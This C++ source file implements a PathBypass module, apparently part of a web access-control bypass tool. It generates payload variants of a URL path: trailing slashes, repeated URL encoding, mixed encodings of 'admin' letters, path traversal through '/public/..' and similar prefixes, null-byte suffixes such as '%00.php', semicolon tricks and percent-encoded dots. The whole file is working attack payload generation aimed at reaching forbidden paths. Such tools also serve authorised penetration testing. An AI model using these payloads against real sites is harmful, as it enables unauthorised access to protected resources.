#include "techniques/path_bypass.hpp"
#include "common/utils.hpp"

namespace byps {

PathBypass::PathBypass() {
}

std::vector<std::string> PathBypass::generateVariations(const std::string& path) {
    std::vector<std::string> all_variations;
    
    // Add trailing slash variations
    auto trailing = addTrailingSlash(path);
    all_variations.insert(all_variations.end(), trailing.begin(), trailing.end());
    
    // Add URL encoding variations
    auto encoded = urlEncodingVariations(path);
    all_variations.insert(all_variations.end(), encoded.begin(), encoded.end());
    
    // Add case variations
    auto cases = caseVariations(path);
    all_variations.insert(all_variations.end(), cases.begin(), cases.end());
    
    // Add path traversal
    auto traversal = pathTraversal(path);
    all_variations.insert(all_variations.end(), traversal.begin(), traversal.end());
    
    // Add null byte injection
    auto null_bytes = nullByteInjection(path);
    all_variations.insert(all_variations.end(), null_bytes.begin(), null_bytes.end());
    
    // Add dot segments
    auto dots = dotSegments(path);
    all_variations.insert(all_variations.end(), dots.begin(), dots.end());
    
    // Add semicolon bypass
    auto semicolons = semicolonBypass(path);
    all_variations.insert(all_variations.end(), semicolons.begin(), semicolons.end());
    
    // Add percent-encoded dots
    auto percent_dots = percentEncodedDots(path);
    all_variations.insert(all_variations.end(), percent_dots.begin(), percent_dots.end());
    
    return all_variations;
}

std::vector<std::string> PathBypass::addTrailingSlash(const std::string& path) {
    std::vector<std::string> variations;
    
    if (!path.empty() && path.back() != '/') {
        variations.push_back(path + '/');
        variations.push_back(path + "//");
        variations.push_back(path + "/.");
        variations.push_back(path + "/./");
    }
    
    if (path.length() > 1 && path.back() == '/') {
        variations.push_back(path.substr(0, path.length() - 1));
    }
    
    return variations;
}

std::vector<std::string> PathBypass::urlEncodingVariations(const std::string& path) {
    std::vector<std::string> variations;
    
    // Single encoding
    variations.push_back(utils::urlEncode(path));
    
    // Double encoding
    variations.push_back(utils::urlEncodeMultiple(path, 2));
    
    // Triple encoding
    variations.push_back(utils::urlEncodeMultiple(path, 3));
    
    // Partial encoding - encode only first character
    if (!path.empty() && path[0] == '/') {
        std::string partial = "%2f" + path.substr(1);
        variations.push_back(partial);
    }
    
    // Mixed case encoding
    std::string mixed;
    for (char c : path) {
        if (c == 'a' || c == 'A') {
            mixed += "%61";  // lowercase 'a'
        } else if (c == 'd' || c == 'D') {
            mixed += "%64";  // lowercase 'd'
        } else if (c == 'm' || c == 'M') {
            mixed += "%6d";  // lowercase 'm'
        } else if (c == 'i' || c == 'I') {
            mixed += "%69";  // lowercase 'i'
        } else if (c == 'n' || c == 'N') {
            mixed += "%6e";  // lowercase 'n'
        } else {
            mixed += c;
        }
    }
    variations.push_back(mixed);
    
    return variations;
}

std::vector<std::string> PathBypass::caseVariations(const std::string& path) {
    return utils::generateCaseVariations(path);
}

std::vector<std::string> PathBypass::pathTraversal(const std::string& path) {
    std::vector<std::string> variations;
    
    if (!path.empty() && path[0] == '/') {
        variations.push_back("/." + path);
        variations.push_back("/./" + path.substr(1));
        variations.push_back("/./." + path);
        variations.push_back("/../" + path.substr(1));
        variations.push_back("/allowed/.." + path);
        variations.push_back("/public/.." + path);
        variations.push_back("/static/.." + path);
    }
    
    return variations;
}

std::vector<std::string> PathBypass::nullByteInjection(const std::string& path) {
    std::vector<std::string> variations;
    
    variations.push_back(path + "%00");
    variations.push_back(path + "%00.jpg");
    variations.push_back(path + "%00.php");
    variations.push_back(path + "%00.html");
    variations.push_back(path + std::string(1, '\0'));
    
    return variations;
}

std::vector<std::string> PathBypass::dotSegments(const std::string& path) {
    std::vector<std::string> variations;
    
    if (!path.empty() && path[0] == '/') {
        std::string base = path.substr(1);
        variations.push_back("/." + base);
        variations.push_back("/./" + base);
        variations.push_back("/././" + base);
        variations.push_back("/../" + base);
    }
    
    return variations;
}

std::vector<std::string> PathBypass::semicolonBypass(const std::string& path) {
    std::vector<std::string> variations;
    
    variations.push_back(path + ";");
    variations.push_back(path + ";/");
    variations.push_back(path + ";x");
    variations.push_back(path + ";.jpg");
    
    return variations;
}

std::vector<std::string> PathBypass::percentEncodedDots(const std::string& path) {
    std::vector<std::string> variations;
    
    if (!path.empty() && path[0] == '/') {
        std::string base = path.substr(1);
        variations.push_back("/%2e/" + base);
        variations.push_back("/%2e%2e/" + base);
        variations.push_back("/%252e/" + base);  // double encoded
        variations.push_back("/%252e%252e/" + base);
    }
    
    return variations;
}

bool PathBypass::isValidPath(const std::string& path) {
    return !path.empty() && path[0] == '/';
}

} // namespace byps
